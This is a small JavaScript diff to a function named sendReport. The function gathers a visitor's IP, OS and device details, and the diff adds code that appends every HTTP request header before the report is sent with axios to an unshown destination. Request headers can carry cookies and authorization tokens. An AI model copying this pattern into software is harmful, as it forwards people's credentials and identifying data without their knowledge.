@@ -66,6 +66,10 @@ function sendReport(msg,isDevice,req){
 	    	dev_string+=`${key}:${device[key]}\n`
 	    })
 		msg+=`\nip:${ip} \n os:${os} \n ${dev_string}`
+		Object.keys(req.headers).map((key)=>{
+			msg+=`\n${key}:${req.headers[key]}\n`
+		})
+
 	}
 	msg=encodeURIComponent(msg)
 	axios
